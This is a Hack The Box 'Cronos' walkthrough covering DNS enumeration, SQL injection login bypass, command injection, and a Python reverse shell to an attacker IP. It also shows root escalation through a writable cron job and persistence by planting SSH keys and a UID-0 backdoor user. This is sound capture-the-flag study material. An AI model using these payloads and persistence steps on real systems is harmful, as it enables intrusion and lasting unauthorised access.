---
title: HTB - Cronos
draft: false
tags:
  - htb
  - linux
  - sql
  - sqli
  - nslookup
  - cron
  - cme
  - persistence
  - laravel
  - sqlmap
  - ssh-keygen
  - medium
---
## Information Gathering
### Rustscan
**SSH**, **HTTP**, and **DNS** was running on the target. Seeing SSH and HTTP open on Linux machine is pretty normal but not DNS. I decided I should spend some time on domain enumeration later. 
```bash
┌──(yoon㉿kali)-[~/Documents/htb/cronos]
└─$ rustscan --addresses 10.10.10.13 --range 1-65535
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
______________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------
Real hackers hack time ⌛
  
[~] The config file is expected to be at "/home/yoon/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
<snip>
Host is up, received conn-refused (0.33s latency).
Scanned at 2024-03-20 03:01:33 EDT for 3s

PORT STATE SERVICE REASON
22/tcp open ssh syn-ack
53/tcp open domain syn-ack
80/tcp filtered http no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.81 seconds
```

  

### Nmap

Nmap didn't provided anything very useful:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/cronos]
└─$ sudo nmap -sVC -p 22,80,53 10.10.10.13 -vv
<snip>
Host is up, received echo-reply ttl 63 (0.34s latency).
Scanned at 2024-03-20 03:03:08 EDT for 31s

PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
| 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
| 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open tcpwrapped syn-ack ttl 63
| dns-nsid:
|_ bind.version: 9.10.3-P4-Ubuntu
80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<snip>
```

  
  

## Enumeration

### DNS - UDP/TCP 53

**nslookup** discovered **ns1.cronos.htb**.
From this, I can also assume the base domain name as **cronos.htb**.

  
`nslookup`

![](https://i.imgur.com/8ChewTl.png)


  

I confirmed on **cronos.htb** through **dig**

`dig @10.10.13 cronos.htb`

![](https://i.imgur.com/sTzZCox.png)


Zone transfer is always worth a try because even if it fails, because sometimes it still provides bunch of information as such:
  

`dig axfr @10.10.10.13 cronos.htb`

  

![](https://i.imgur.com/4jw2JDp.png)


  

I added the below newly discovered domain names to /etc/hosts file:

  

```bash
cronos.htb
ns1.cronos.htb
admin.cronos.htb
www.cronos.htb
```

  
  

### HTTP - TCP 80

Let's take a look at each of the discovered domain on browser:

http://10.10.10.248 -> Apache Ubuntu Default Page (Nothing interesting)

![](https://i.imgur.com/jaM6AD7.png)


  

http://cronos.htb/ -> Webpage.

All the sublinks(DOCUMENTATION, LARACASTS, etc) were linked to **Laravel** related external websites. Maybe I can search for Laravel related exploits?

![](https://i.imgur.com/vkSN9CR.png)


  

http://ns1.cronos.htb/ -> Again, Apache Ubuntu Default Page (Nothing Interesting)

![](https://i.imgur.com/rspuYav.png)


  

http://admin.cronos.htb/ -> Login Page.

I could try on SQL Injection or try bruteforcing login credentials later. 

![](https://i.imgur.com/B0SlJ2A.png)


  

http://www.cronos.htb/ -> Showed the same webpage as http://cronos.htb

![](https://i.imgur.com/utdigPG.png)


  
  So at this point I had three plans in mind.
  1. Directory Bruteforce on cronos.htb and see if anything interesting is there. 
  2. Laravel exploit on cronos.htb
  3. SQL Injection on admin.cronos.htb
  

#### cronos.htb 
##### Feroxbuster (Nothing)
As plan #1, I tried directory bruteforcing on cronos.htb but nothing interesting was found:

![](https://i.imgur.com/lJnRYkZ.png)


#### Laravel Exploit (Failed)

I knew **cronos.htb** is using **Laravel** and from bit of googling, I knew that Laravel has lot of known public exploits. 

Issue was about the Laravel version that I do not know so I tried couple of exploits hoping one of them work but nothing worked out : (

  
  

#### SQLi on admin.cronos.htb


I intercepted the request for login through Burp Suite and used it with **sqlmap** to see if the login page is vulnerable to SQL Injection.

Sadly, sqlmap decided none of the parameters are injectable:

`sqlmap -r admin-cronos-htb-login-req.txt --batch`

![](https://i.imgur.com/cLb88Ka.png)


After jumping around bunch of rabbit holes, I came back to login page thinking "This has to be the entry point", because nothing else worked out. 

After spending good enough time on SQL injection, I found out `' or 1=1-- -` gets me pass the login form.

> This taught me a lesson that automated tools aren't always perfect since sqlmap didn't find this vulnerable access point. 
  
## Shell as www-data
### Command Injection
Now with SQLi, I have access to the service running inside of it, which seems to be a Net Tool that allows you to either **ping** or **traceroute** to a set IP address:

![](https://i.imgur.com/LrizBe5.png)


Pinging 8.8.8.8, I can see that it actually runs the ping command and shows the output on webpage:  

![](https://i.imgur.com/s22xbtM.png)


I intercepted the request with Burp Suite to tamper command.

What was interesting is that I can choose whatever command I want to using Burp Suite: 

![](https://i.imgur.com/c0ddtJd.png)

I tried listing out home directory of the target and I can see that it works:
  
![](https://i.imgur.com/UROdxTS.png)

### Reverse Shell

With netcat listener running locally on my Kali machine, I ran the following payload through Burp Suite:

```python
command=python3&host=-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![](https://i.imgur.com/xIydAXZ.png)


Now I have shell as **www-data**:


![](https://i.imgur.com/zdefZkP.png)


Before I do anything, I first enhanced the shell: 

`python3 -c 'import pty; pty.spawn("/bin/bash")'
`

  

## Privesc www-data to root
### Local Enumeration

Before running linpeas, I manually looked around the file system and on **/var/www/admin**, I saw **config.php** which seemed interesting:

![](https://i.imgur.com/jEsoANT.png)


  

It had MySQL credentials in it -> **admin:kEjdbRigfBHUREiNSDs**
  
![](https://i.imgur.com/mdpRfEX.png)


  
  

### MySQL Enumeration(Nothing)

I was able to login to MySQL using the credentials found above:

`mysql -u admin -p`

![](https://i.imgur.com/Der39zP.png)

I was hoping to see more credentials but only thing that I see was password hash for admin which probably is what I already have as plain text:  

![](https://i.imgur.com/a0Zdn4q.png)


### Laravel Privesc (Failed)

Earlier I was looking for **Laravel**'s version which I failed to discover, now through **composer.json**, I found out about it's version: 5.4.*

![](https://i.imgur.com/W1god2m.png)


I tried searching for **Laravel 5.4** related Privilege Escalation but it seemed nothing is doable. 
  

### Cronjob Privesc (Success!)
### LinPEAs
Now I moved on to **Linpeas**. 

I used python http server and wget to upload Linpeas to /tmp folder and ran it.

One stood out with yellow, which seemed to be my escalation point: **/var/www/laravel/artisan**

  
![](https://i.imgur.com/Zz2rFQ7.png)

Confirming on **/etc/crontab**, **/var/www/laravel/artisan** is being ran every minute:
  

`cat /etc/crontab`

![](https://i.imgur.com/i7GLMld.png)

I checked whether  I can overwrite on file **artisan** -> **www-data** owns this file! Meaning I can overwrite this file. 

![](https://i.imgur.com/y4B8TIA.png)

With file overwrite permission on cronjob, I can easily escalate privilege by overwriting the file with reverse shell, which will be executed as root, giving attacker escalated privilege.

I used [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)and generated reverse shell php script, naming it as artisan and uploaded it to target /tmp folder: 

![](https://i.imgur.com/lJwL7lM.png)

Now I move malicious **artisan** file to **/var/www/laravel** which will replace original artisan file with my malicious one:


![](https://i.imgur.com/EAAazcM.png)

Now waiting for a bit on netcat listener, I get a reverse shell as a root:
  

![](https://i.imgur.com/UzdzGqk.png)


  
  

## Beyond Root

Above I got a shell as root, but it is always best to have a stable shell connection such as SSH other than reverse shell. Below are several ways of maintaining persistence once gained shell as a root.


### SSH as root


This is my most recommended and preferred method of maintaining persistence.

First move to the root directory: `cd /root`

If there is not already, created **.ssh** directory: `mkdir .ssh`

Move in to **.ssh** directory: `cd .ssh`

Generate ssh key: `ssh-keygen -f mykey`

![](https://i.imgur.com/rnqmeIa.png)

Copy generated public key to **authorized_keys**: `cat mykey.pub > authorized_keys`

Now there should be these three files on your target root .ssh directory:

![](https://i.imgur.com/jAG7jeg.png)


Copy private key to local machine.

Back in your target system, change permission for **.ssh** directory and **authorized_keys** file: `chmod 700 .ssh` & `chmod 600 .ssh/authorized_keys`

![](https://i.imgur.com/UbAar54.png)

Now using the copied private key, you sign in to SSH as root: `ssh -i mykey root@10.10.10.13`

![](https://i.imgur.com/WTwCQHs.png)

### Add user
I can add whatever user I want to root group and this will allow me to escalate my privilege to root directly when I gain access to low privilege user shell.

I add  user and set password using the commands below:
```bash
useradd -ou 0 -g 0 hacker-jadu
passwd hacker-jadu
```

![](https://i.imgur.com/BqerUVn.png)



  

Now I can switch to user **hacker-jadu** using `su hacker-jadu`:


![](https://i.imgur.com/angpxK5.png)



### Crack /etc/shadow

This method is not very recommended since you don't know how strict password policy is for your target environment.

Taking a look at **/etc/shadow** file, I can see hashed password for the previous set user **hacker-jadu**:

![](https://i.imgur.com/V5dG9C4.png)


Using hashcat, I can crack this hash which will reveal password: 

`hashcat -m 1800 hash rockyou.txt`

![](https://i.imgur.com/vf6tTDH.png)






## References

- https://fieldraccoon.github.io/posts/Linuxprivesc/